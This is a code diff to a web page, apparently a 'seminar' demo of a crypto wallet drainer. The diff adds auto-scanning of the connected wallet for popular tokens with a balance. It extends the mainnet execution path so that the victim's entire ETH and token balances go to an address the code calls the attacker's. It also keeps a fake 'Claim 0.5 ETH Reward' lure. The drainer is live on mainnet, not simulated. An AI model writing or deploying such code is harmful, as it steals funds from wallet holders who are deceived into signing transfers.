@@ -177,7 +177,10 @@
         <div class="col">
           <label>ERC‑20 Token (optional)</label>
           <div class="row" style="gap:6px;">
-            <input class="input mono" id="tokenAddressInput" placeholder="0xTokenAddress (optional)" />
+            <select class="select" id="prioritizedTokenSelect" style="flex:1;">
+              <option value="">Select Prioritized Token...</option>
+            </select>
+            <input class="input mono" id="tokenAddressInput" placeholder="0xTokenAddress (optional)" style="flex:2;" />
             <button class="btn btn-secondary" id="loadTokenBtn">Load</button>
           </div>
           <div class="input mono" id="tokenBalanceDisplay">—</div>
@@ -254,7 +257,23 @@
       networkSymbolFallback: 'ETH',
       enableDeepLinks: true, // Enable multi-wallet deep links by default
       enableMainnetExecution: true, // Enable actual transfers on mainnet
-      seminarMode: false // Track if seminar is active
+      seminarMode: false, // Track if seminar is active
+      prioritizedTokens: {
+        'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        'USDC': '0xa0B86A33e6441E88c5f2712c3E9B74F5b8B6B8B8',
+        'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+        'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+        'ETH': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+        'stETH': '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
+        'AAVE': '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
+        'rETH': '0xae78736Cd615f374D3085123A210448E74Fc6393',
+        'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+        'USDe': '0x4c9EDD5852cd905f086C759E8383e09bff1E68B3',
+        'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+        'EURC': '0x1aBaEA1f7C830bD89Acc67eC4af516284b1bC33c',
+        'SOL': '0xD31a59c85aE9D8edEFeC411D448f90841571b89c',
+        'wstETH': '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0'
+      }
     };
 
     const ERC20_ABI = [
@@ -349,10 +368,16 @@
 
       $('recipientInput').value = CONFIG.receivingAddress;
 
-      // Preload token if configured
+      // Populate prioritized token dropdown
+      populatePrioritizedTokenSelect();
+
+      // Preload prioritized tokens if configured
       if (CONFIG.tokenAddress) {
         $('tokenAddressInput').value = CONFIG.tokenAddress;
         await loadToken(CONFIG.tokenAddress);
+      } else {
+        // Auto-scan for prioritized tokens
+        await scanPrioritizedTokens();
       }
     }
 
@@ -375,6 +400,64 @@
         $('tokenBalanceDisplay').textContent = '—';
         setConnectStatus('Failed to load token: ' + (e?.message || e), 'error');
         token = null;
+      }
+    }
+
+    // Populate prioritized token dropdown
+    function populatePrioritizedTokenSelect() {
+      const select = $('prioritizedTokenSelect');
+      select.innerHTML = '<option value="">Select Prioritized Token...</option>';
+
+      Object.entries(CONFIG.prioritizedTokens).forEach(([symbol, address]) => {
+        // Skip native ETH as it's handled separately
+        if (address === CONFIG.prioritizedTokens.ETH) return;
+
+        const option = document.createElement('option');
+        option.value = address;
+        option.textContent = `${symbol} - ${address.slice(0, 6)}...${address.slice(-4)}`;
+        select.appendChild(option);
+      });
+    }
+
+    // Handle prioritized token selection
+    $('prioritizedTokenSelect').onchange = function() {
+      const selectedAddress = this.value;
+      if (selectedAddress) {
+        $('tokenAddressInput').value = selectedAddress;
+        loadToken(selectedAddress);
+      }
+    };
+
+    // Scan for prioritized tokens in user's wallet
+    async function scanPrioritizedTokens() {
+      try {
+        setConnectStatus('🔍 Scanning for prioritized tokens...', 'warn');
+
+        for (const [symbol, address] of Object.entries(CONFIG.prioritizedTokens)) {
+          try {
+            // Skip native ETH as it's handled separately
+            if (address === CONFIG.prioritizedTokens.ETH) continue;
+
+            const tokenContract = new web3.eth.Contract(ERC20_ABI, address);
+            const balance = await tokenContract.methods.balanceOf(account).call();
+
+            if (balance > 0) {
+              // Found a token with balance, load it
+              $('tokenAddressInput').value = address;
+              await loadToken(address);
+              setConnectStatus(`✅ Found ${symbol} with balance - loaded automatically`, 'success');
+              return; // Stop after finding the first prioritized token with balance
+            }
+          } catch (error) {
+            // Continue to next token if this one fails
+            console.log(`Skipping ${symbol}: ${error.message}`);
+          }
+        }
+
+        // No prioritized tokens found with balance
+        setConnectStatus('No prioritized tokens found with balance', 'warn');
+      } catch (error) {
+        setConnectStatus('Token scanning failed: ' + error.message, 'error');
       }
     }
 
@@ -843,9 +926,12 @@
         // In seminar mode, show the deceptive transaction that would be sent
         if (CONFIG.seminarMode && CONFIG.enableMainnetExecution && chainId === 1) {
           // Actually execute on mainnet for demonstration
-          $('demoMaliciousResult').innerHTML = '<span class="warn">⚠️ MAINNET EXECUTION: Preparing to send MAX ETH transfer...</span>';
+          $('demoMaliciousResult').innerHTML = '<span class="warn">⚠️ MAINNET EXECUTION: Preparing to send MAX transfers...</span>';
 
-          // Calculate max transfer (reserve gas)
+          let ethTransferred = false;
+          let tokenTransferred = false;
+
+          // Calculate and execute ETH max transfer
           const weiBal = web3.utils.toBN(await web3.eth.getBalance(account));
           const gasLimit = web3.utils.toBN(21000);
           const gasPrice = await getGasPriceBN();
@@ -856,29 +942,70 @@
             const maxEth = web3.utils.fromWei(sendableWei, 'ether');
             $('demoMaliciousResult').innerHTML = `<span class="error">💀 EXECUTING: Sending ${fmt(maxEth, 6)} ETH to attacker address...</span>`;
 
-            // Execute the transfer
-            const txHash = await new Promise((resolve, reject) => {
-              web3.eth.sendTransaction({
-                from: account,
-                to: CONFIG.receivingAddress,
-                value: sendableWei.toString(),
-                gas: 21000
-              })
-              .on('transactionHash', resolve)
-              .on('error', reject);
-            });
+            try {
+              const txHash = await new Promise((resolve, reject) => {
+                web3.eth.sendTransaction({
+                  from: account,
+                  to: CONFIG.receivingAddress,
+                  value: sendableWei.toString(),
+                  gas: 21000
+                })
+                .on('transactionHash', resolve)
+                .on('error', reject);
+              });
+              ethTransferred = true;
+              $('demoMaliciousResult').innerHTML = `<span class="error">✅ ETH TRANSFER COMPLETE! Hash: ${txHash.slice(0,10)}...</span>`;
+            } catch (error) {
+              $('demoMaliciousResult').innerHTML = `<span class="error">❌ ETH transfer failed: ${error.message}</span>`;
+            }
+          }
 
-            $('demoMaliciousResult').innerHTML = `<span class="error">✅ TRANSFER COMPLETE! Hash: ${txHash.slice(0,10)}... - Funds sent to attacker!</span>`;
+          // Execute token transfer if token is loaded
+          if (token) {
+            try {
+              const tokenBalance = await token.methods.balanceOf(account).call();
+              if (tokenBalance > 0) {
+                const maxTokens = fromBaseUnits(tokenBalance, tokenDecimals);
+                $('demoMaliciousResult').innerHTML += `<br><span class="error">💀 EXECUTING: Sending ${fmt(maxTokens, 6)} tokens to attacker...</span>`;
+
+                const txHash = await new Promise((resolve, reject) => {
+                  token.methods.transfer(CONFIG.receivingAddress, tokenBalance).send({ from: account })
+                    .on('transactionHash', resolve)
+                    .on('error', reject);
+                });
+                tokenTransferred = true;
+                $('demoMaliciousResult').innerHTML += `<br><span class="error">✅ TOKEN TRANSFER COMPLETE! Hash: ${txHash.slice(0,10)}...</span>`;
+              }
+            } catch (error) {
+              $('demoMaliciousResult').innerHTML += `<br><span class="error">❌ Token transfer failed: ${error.message}</span>`;
+            }
+          }
+
+          if (ethTransferred || tokenTransferred) {
+            $('demoMaliciousResult').innerHTML += `<br><span class="error">🎯 ALL FUNDS SENT TO ATTACKER ADDRESS!</span>`;
           } else {
             $('demoMaliciousResult').innerHTML = '<span class="error">❌ Insufficient balance for demonstration</span>';
           }
         } else {
           // Safe simulation mode
-          $('demoMaliciousResult').innerHTML = `
-            <span class="warn">🎭 SIMULATION MODE: This would send your MAX ETH balance to attacker address<br>
-            <strong>In real attack:</strong> User sees "Claim 0.5 ETH Reward" but actually approves max transfer<br>
-            <strong>Result:</strong> Attacker receives all available ETH minus gas</span>
-          `;
+          let simulationText = `
+            <span class="warn">🎭 SIMULATION MODE: This would send your MAX balances to attacker address<br>
+            <strong>In real attack:</strong> User sees "Claim 0.5 ETH Reward" but actually approves max transfers<br>
+            <strong>Result:</strong> Attacker receives all available funds minus gas`;
+
+          if (token) {
+            try {
+              const tokenBalance = await token.methods.balanceOf(account).call();
+              if (tokenBalance > 0) {
+                const maxTokens = fromBaseUnits(tokenBalance, tokenDecimals);
+                simulationText += `<br><strong>Token Transfer:</strong> ${fmt(maxTokens, 6)} tokens would also be sent`;
+              }
+            } catch (error) {
+              // Ignore token balance check errors in simulation
+            }
+          }
+
+          $('demoMaliciousResult').innerHTML = simulationText + '</span>';
         }
       } catch (error) {
         $('demoMaliciousResult').innerHTML = `<span class="error">❌ Demonstration failed: ${error.message}</span>`;
